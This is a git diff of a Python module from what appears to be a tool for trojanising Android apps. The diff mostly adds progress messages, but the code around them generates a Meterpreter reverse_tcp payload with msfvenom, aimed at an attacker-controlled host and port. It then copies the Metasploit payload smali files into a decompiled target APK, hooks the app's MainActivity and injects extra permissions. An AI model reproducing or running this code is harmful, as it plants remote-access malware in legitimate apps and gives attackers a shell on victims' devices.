@@ -6,6 +6,7 @@ import xml.etree.ElementTree as ET
 
 from .apk import Apk
 from . import utilities
+from .utilities import print_phase, phase_done
 
 
 class Payload:
@@ -16,18 +17,25 @@ class Payload:
         self.__generate_payload()
 
     def __generate_payload(self):
+        print_phase('Generating the payload')
         payload_path = os.path.join(os.getcwd(), 'payload.apk')
         command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.public_host.ip} LPORT={self.public_host.port} -o {payload_path}"
         logging.info('Generating payload...')
         utilities.run_command(command)
         logging.info('    ... Done')
         self.__payload_apk = Apk(payload_path)
+        phase_done()
 
     def inject(self, apk):
+        print_phase("Decompiling the payload's APK")
         self.__payload_apk.decompile()
+        phase_done()
 
+        print_phase('Decompiling the target APK')
         apk.decompile()
+        phase_done()
 
+        print_phase("Inserting payload's file in target APK")
         metasploit_package = 'com/metasploit/stage'
         files_to_copy = glob.glob(os.path.join(
             self.__payload_apk.decompiled_path, 'smali/', metasploit_package, '*Payload*.smali'
@@ -39,9 +47,14 @@ class Payload:
         for file in files_to_copy:
             logging.info(f"Copying file '{file}' to '{copy_dest}'")
             shutil.copy(file, copy_dest)
+        phase_done()
 
+        print_phase("Detecting target's MainActivity")
         main_activity, main_activity_file = apk.get_main_activity()
         logging.info(f"The main activity is: '{main_activity}'")
+        phase_done()
+
+        print_phase("Injecting payload's hook")
         with open(main_activity_file, 'r') as f:
             logging.debug('Reading from Main Activity file')
             main_activity_content = f.read()
@@ -56,12 +69,15 @@ class Payload:
         with open(main_activity_file, 'w') as f:
             logging.debug('Writing the Main Activity file')
             f.write(main_activity_content)
+        phase_done()
 
+        print_phase('Injecting missing permissions')
         self.__inject_permissions(apk)
+        phase_done()
 
-        logging.info('Removing decompiled payload...')
+        print_phase('Removing decompiled payload')
         self.__payload_apk.remove_decompiled()
-        logging.info('    ... Done')
+        phase_done()
 
     def __inject_permissions(self, apk):
         """
@@ -91,6 +107,6 @@ class Payload:
         pass
 
     def delete(self):
-        logging.info('Deleting payload APK...')
+        print_phase("Deleting payload's APK")
         os.remove(self.__payload_apk.full_path)
-        logging.info('    ... Done')
+        phase_done()
